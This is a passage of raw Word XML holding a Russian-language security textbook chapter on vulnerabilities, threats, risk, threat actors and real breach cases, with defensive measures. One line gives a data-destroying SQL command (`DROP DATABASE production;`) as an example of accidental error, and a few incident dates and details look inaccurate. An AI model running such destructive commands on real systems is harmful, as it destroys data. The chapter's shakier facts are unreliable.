      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не обновили</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (забили хуй). В мае хакеры использовали эту уязвимость и украли данные </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>147 миллионов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> человек. Ущерб: $700 миллионов штрафов, увольнение CEO, акции упали на 35%.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t>: Уязвимость сама по себе не опасна, пока её не используют. Это как дырка в заборе: если никто не знает о дырке, она безвредна. Но если воры узнали — всё, жди проблем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Угроза (Threat)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Потенциальная опасность</w:t>
      </w:r>
      <w:r>
        <w:t>, которая может использовать уязвимость и нанести ущерб активу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры угроз</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Внешние**: хакеры, вирусы, DDoS-атаки, конкуренты-шпионы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Внутренние**: недовольный сотрудник, случайное удаление файлов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Природные**: пожар, наводнение, землетрясение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Техногенные**: отключение электричества, авария в дата-центре</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Уязвимость — открытый SSH-порт без ограничения IP. Угроза — ботнет пытается подобрать пароль (brute force). Если угроза использует уязвимость → получим </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>инцидент</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (взлом).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Риск (Risk)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вероятность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> того, что угроза использует уязвимость и нанесёт ущерб.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формула</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Риск = Вероятность × Ущерб</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Низкий риск</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уязвимость**: SSH на порту 22 открыт только для локальной сети (192.168.1.0/24)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Угроза**: хакеры из интернета пытаются подключиться</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вероятность**: очень низкая (они не могут достучаться до порта)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ущерб**: если бы смогли — высокий (полный контроль над сервером)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Риск**: низкий (вероятность × ущерб = 0.01 × 100 = 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Высокий риск</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уязвимость**: SSH открыт на весь интернет, пароль root — `123456`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Угроза**: ботнет перебирает пароли</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вероятность**: очень высокая (автоматизированные атаки происходят постоянно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ущерб**: высокий (полный контроль над сервером)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Риск**: критический (вероятность × ущерб = 0.9 × 100 = 90)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Управление рисками</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Risk Management):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Снижение (Mitigation)**: закрыть уязвимость (обновить ПО, поставить firewall)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Принятие (Acceptance)**: если риск низкий, можно ничего не делать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Передача (Transfer)**: купить страховку от кибератак</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Избегание (Avoidance)**: вообще не использовать технологию (например, не подключать критичные системы к интернету)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.3.2. Классификация угроз по источнику</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Угрозы приходят отовсюду. Давай разберём, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>кто</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> угрожает твоим данным.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Внутренние угрозы (Insider Threats)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кто</w:t>
      </w:r>
      <w:r>
        <w:t>: Сотрудники, подрядчики, партнёры — любой, у кого есть легитимный доступ к системе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему это опасно</w:t>
      </w:r>
      <w:r>
        <w:t>: У инсайдеров уже есть доступ. Им не нужно ломать firewall или подбирать пароли. Они просто берут и копируют базу данных на флешку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Виды инсайдеров</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>А) Злонамеренные (Malicious Insiders)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Недовольный сотрудник**: Увольняют программиста, он перед уходом удаляет production-базу или выкладывает исходный код на GitHub.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Инсайдер-шпион**: Сотрудник получает взятку от конкурентов и сливает им коммерческие секреты.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Саботаж**: Системный администратор встраивает бэкдор (backdoor), чтобы иметь доступ после увольнения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Б) Неосторожные (Negligent Insiders)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Фишинг**: Сотрудник кликает на письмо "Ваш аккаунт заблокирован, введите пароль здесь" → хакеры получают доступ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Потеря устройства**: Оставил ноутбук с секретными документами в кафе.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Слабый пароль**: Использует `Password123` → хакеры подбирают пароль.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Случайное удаление**: Джуниор-разработчик выполнил `DROP DATABASE production;` вместо `DROP DATABASE test;`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример 1: Tesla (2018)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Что произошло**: Недовольный сотрудник **Мартин Трипп** (Martin Tripp) украл конфиденциальные данные производства Tesla и слил их журналистам.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Мотивация**: Считал, что Tesla скрывает проблемы с безопасностью батарей.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итог**: Tesla подала в суд на $167 миллионов. Трипп проиграл.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример 2: Edward Snowden (2013)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кто**: Эдвард Сноуден, подрядчик АНБ (Агентство национальной безопасности США).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Что произошло**: Скопировал 1.7 миллиона секретных документов о массовой слежке АНБ за гражданами.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итог**: Сноуден сбежал в Россию, получил политическое убежище. США объявили его предателем, правозащитники — героем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Принцип наименьших привилегий** (Least Privilege): каждый сотрудник имеет доступ только к тому, что нужно для работы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Мониторинг**: логирование действий (кто что скачивал, изменял, удалял).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DLP (Data Loss Prevention)**: система, которая блокирует копирование конфиденциальных данных на флешки, отправку на личный email.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обучение**: тренинги по фишингу, политике паролей.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Exit interview**: при увольнении сразу отключать доступы (аккаунты, пропуска, VPN).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Внешние угрозы (External Threats)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кто</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Злоумышленники, у которых </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нет легитимного доступа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> к системе. Им нужно сначала взломать систему, а потом уже красть данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Виды внешних угроз</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>А) Хакеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Script Kiddies (Скрипт-кидди)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кто**: Новички, которые используют готовые инструменты (Metasploit, Nmap, SQLMap) без глубокого понимания.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Мотивация**: "Прикольно взломать сайт и написать на главной странице 'Hacked by 1337_h4x0r'".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Опасность**: Низкая, но их много. Могут случайно нанести вред (например, DDoS-атака из любопытства).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Хактивисты (Hacktivists)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кто**: Хакеры с политическими мотивами.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Примеры**: **Anonymous** (взламывали сайты правительств, церкви Саентологии), **LulzSec**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Мотивация**: Протест, месть, привлечение внимания к проблеме.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Опасность**: Средняя. Могут устроить DDoS, утечку данных, дефейс (замена главной страницы сайта).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кибепреступники (Cybercriminals)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кто**: Профессиональные хакеры, цель — **деньги**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Методы**: Ransomware (шифрование данных за выкуп), кража банковских карт, продажа баз данных на даркнете.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Опасность**: Высокая. Хорошо организованы, используют передовые методы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>APT (Advanced Persistent Threat) — Государственные акторы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кто**: Кибервойска, спецслужбы (Россия, США, Китай, Северная Корея, Израиль).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Цель**: Шпионаж, саботаж критической инфраструктуры (электростанции, военные системы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Методы**: Очень продвинутые. Могут взламывать air-gapped системы (не подключённые к интернету), использовать 0-day уязвимости (неизвестные уязвимости).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Опасность**: Критическая. Но большинство компаний не интересны для APT (если ты не Газпром, Пентагон или завод по обогащению урана).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры APT</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**APT28 (Fancy Bear)** — Россия. Атаковали DNC (Демократическую партию США) в 2016 году, утечка писем Хиллари Клинтон.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**APT29 (Cozy Bear)** — Россия. Атаковали SolarWinds (2020), взломали тысячи компаний и госорганизаций.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Lazarus Group** — Северная Корея. Взломали Sony Pictures (2014), WannaCry (2017), украли $81 миллион из Центрального банка Бангладеш.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Б) Конкуренты (Промышленный шпионаж)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кто**: Конкурирующие компании.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Цель**: Украсть коммерческие секреты (формулы, чертежи, базу клиентов, маркетинговую стратегию).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Методы**: Подкуп инсайдеров, взлом систем, социальная инженерия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2019 году бывший сотрудник Apple </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сяолан Чжан</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Xiaolang Zhang) украл чертежи автономного автомобиля и попытался передать их китайской компании. Его арестовали в аэропорту.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Природные и техногенные угрозы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Не только люди угрожают твоим данным. Иногда природа и случайности делают это лучше любого хакера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Природные катастрофы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Пожар**: Сервера сгорели → все данные потеряны (если нет backup).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Наводнение**: Затопило дата-центр.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Землетрясение**: Разрушило здание с серверами.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ураган, торнадо**: Повредили линии связи, отключили электричество.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Техногенные</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отключение электричества**: Нет электричества → серверы выключились → данные могут повредиться (если нет ИБП — источника бесперебойного питания).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Авария в ЦОД**: Перегрев (сломался кондиционер), затопление (прорвало трубу).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Человеческая ошибка**: Системный администратор случайно удалил production-БД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример: OVHcloud (2021)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Что произошло**: В марте 2021 года в дата-центре **OVHcloud** (один из крупнейших хостинг-провайдеров Европы) в Страсбурге произошёл **пожар**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ущерб**: Сгорело **4 дата-центра**, потеряны данные **тысяч сайтов**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итог**: Сайты, у которых не было резервных копий в других дата-центрах, **потеряли всё**.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Резервное копирование** (Backup): правило **3-2-1** (3 копии, 2 типа носителей, 1 offsite).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Географическая избыточность**: серверы в нескольких дата-центрах в разных городах/странах.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ИБП (UPS)**: источник бесперебойного питания (батареи, которые дадут время на graceful shutdown).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Генераторы**: дизель-генераторы для длительного отключения электричества.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.3.3. Классификация угроз по типу воздействия (CIA Triad)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Угрозы нарушают один или несколько принципов </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CIA Triad</w:t>
      </w:r>
      <w:r>
        <w:t>: Конфиденциальность (Confidentiality), Целостность (Integrity), Доступность (Availability). Это из главы 9.01, но давай освежим память.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Нарушение конфиденциальности (Confidentiality)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Несанкционированный доступ к данным. Кто-то прочитал то, что не должен был видеть.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Утечка данных (Data Breach)**: Хакеры украли базу с паролями, номерами кредитных карт, медицинскими записями.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
